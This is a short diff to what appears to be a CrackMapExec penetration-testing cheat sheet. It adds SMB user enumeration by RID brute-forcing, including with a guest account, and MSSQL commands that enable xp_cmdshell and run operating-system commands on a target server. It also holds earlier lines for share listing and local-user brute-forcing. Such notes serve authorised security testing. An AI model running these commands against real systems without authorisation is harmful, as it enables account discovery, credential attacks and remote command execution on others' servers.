@@ -22,5 +22,17 @@ cme smb <ip>
 # list shares
 cme smb <ip> --shares
 
+# enumerate user
+cme smb <target> -u '<user>' -p '<pass>' --rid-brute
+
+# enumerate user as guest
+cme smb <target> -u 'guest' -p '' --rid-brute
+
 # bruteforce local user
 cme smb <ip> --local-auth -u <user> -p <pwdlst>
+
+% mssql
+
+# Enable the xp_cmdshell on the target MSSQL
+cme mssql <target> --local-auth -u <user> -p <pass> -q 'EXEC sp_configure "show advanced options", 1;RECONFIGURE;exec SP_CONFIGURE "xp_cmdshell", 1;RECONFIGURE'
+cme mssql <target> --local-auth -u <user> -p <pass> -q 'EXEC xp_cmdshell "whoami"'
